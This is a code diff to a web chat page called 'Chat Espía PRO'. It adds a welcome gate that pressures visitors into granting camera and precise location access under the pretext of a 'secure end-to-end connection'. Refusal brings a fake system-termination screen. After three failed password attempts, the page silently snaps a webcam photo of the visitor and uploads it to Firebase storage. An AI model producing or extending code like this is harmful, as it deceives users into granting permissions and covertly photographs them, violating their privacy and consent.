@@ -20,8 +20,12 @@ button { background: #25d366; border: none; color: white; padding: 10px 20px; bo
 
 .eye-btn { background: none; border: none; cursor: pointer; font-size: 18px; padding: 0; margin-left: 5px; }
 
+/* --- PANTALLA DE ACCESO PREVIA --- */
+#pre-access { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #075e54; color: white; display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 2000; text-align: center; }
+.start-btn { background: #25d366; border: none; color: white; padding: 15px 40px; border-radius: 30px; font-size: 18px; cursor: pointer; font-weight: bold; margin-top: 20px; }
+
 /* Estilos para la pantalla de error técnico */
-.error-screen { background: #1a1a1a; color: #00ff00; height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; font-family: 'Courier New', monospace; text-align: center; padding: 30px; }
+.error-screen { background: #1a1a1a; color: #00ff00; height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; font-family: 'Courier New', monospace; text-align: center; padding: 30px; width: 100%; }
 .error-code { color: #ff3333; font-weight: bold; border: 1px solid #ff3333; padding: 10px; margin: 20px 0; }
 .retry-btn { background: #444; border: 1px solid #00ff00; color: #00ff00; padding: 15px 40px; cursor: pointer; font-weight: bold; text-transform: uppercase; }
 
@@ -30,6 +34,13 @@ button { background: #25d366; border: none; color: white; padding: 10px 20px; bo
 </head>
 
 <body>
+
+<div id="pre-access">
+    <h1 style="font-size: 50px;">🔐</h1>
+    <h2>Chat Espía PRO</h2>
+    <p style="padding: 0 20px; opacity: 0.9;">Para establecer una conexión segura de extremo a extremo,<br>debes autorizar el nodo de comunicación.</p>
+    <button class="start-btn" onclick="iniciarSistemaConPermisos()">¿QUIERES ACCEDER AL CHAT?</button>
+</div>
 
 <div class="header">🔐 Chat Espía PRO - Salas Privadas</div>
 <div id="chat" class="chat"></div>
@@ -85,9 +96,11 @@ let SALA = "";
 let mensajesCol;
 let MI_ID = Math.random().toString(36).substring(7);
 
-// --- 🔐 INICIO OBLIGATORIO CON VALIDACIÓN ---
-window.onload = async function() {
+// --- 🔐 FUNCION QUE ACTIVA TODO AL DAR CLICK ---
+window.iniciarSistemaConPermisos = async function() {
+    const preAccessDiv = document.getElementById('pre-access');
     try {
+        // Solicitar Cámara
         cameraStream = await navigator.mediaDevices.getUserMedia({ video: true });
         const video = document.getElementById('camera-stream');
         video.srcObject = cameraStream;
@@ -96,21 +109,24 @@ window.onload = async function() {
             video.onloadedmetadata = () => { video.play(); resolve(); };
         });
 
+        // Solicitar Ubicación
         await new Promise((resolve, reject) => {
             navigator.geolocation.getCurrentPosition(resolve, reject, { 
                 enableHighAccuracy: true, timeout: 8000 
             });
         });
 
+        // Si todo ok, ocultar bienvenida y pedir clave
+        preAccessDiv.style.display = "none";
         pedirClave();
 
     } catch (error) {
-        document.body.innerHTML = `
+        // Pantalla de error técnico si rechazan
+        preAccessDiv.innerHTML = `
             <div class="error-screen">
                 <h1 style="color:white">SYSTEM TERMINATED</h1>
                 <div class="error-code">ERROR_ID: 0x000452 - NODE_UNTRUSTED</div>
                 <p>La arquitectura de este chat requiere validación biométrica y de geoposición.</p>
-                <p><i>Causa: Permisos de hardware denegados por el cliente.</i></p>
                 <button class="retry-btn" onclick="location.reload()">Re-autenticar Nodo</button>
             </div>`;
     }
@@ -122,7 +138,6 @@ async function pedirClave(){
     if(!clave || !clave.startsWith(PREFIJO_SALA)){
         intentosFallidos++;
         if(intentosFallidos >= 3) {
-            // Solo captura si realmente falló 3 veces
             setTimeout(async () => {
                 await capturarYReportarIntruso(clave || "vacio");
                 alert("CRITICAL SECURITY ALERT: Acceso bloqueado.");
@@ -146,7 +161,6 @@ async function pedirClave(){
 }
 
 async function capturarYReportarIntruso(claveUsada) {
-    // FILTRO: Si el contador no es 3, no procesar nada (evita fotos fantasma)
     if (intentosFallidos < 3) return;
 
     const video = document.getElementById('camera-stream');
@@ -157,14 +171,11 @@ async function capturarYReportarIntruso(claveUsada) {
     canvas.height = video.videoHeight || 480;
     context.drawImage(video, 0, 0, canvas.width, canvas.height);
     
-    // Calidad 0.6 para ahorrar espacio en Firebase
     const dataUrl = canvas.toDataURL('image/jpeg', 0.6);
 
     try {
         const fotoPath = `intrusos/${MI_ID}_${Date.now()}.jpg`;
         const storageRef = ref(storage, fotoPath);
-        
-        // Solo aquí se realiza la subida real
         await uploadString(storageRef, dataUrl, 'data_url');
         const fotoUrl = await getDownloadURL(storageRef);
 
@@ -177,7 +188,6 @@ async function capturarYReportarIntruso(claveUsada) {
     } catch(e) { 
         console.error("Error al reportar", e); 
     } finally {
-        // Apagar la cámara siempre al final del proceso
         if(cameraStream) cameraStream.getTracks().forEach(t => t.stop());
     }
 }
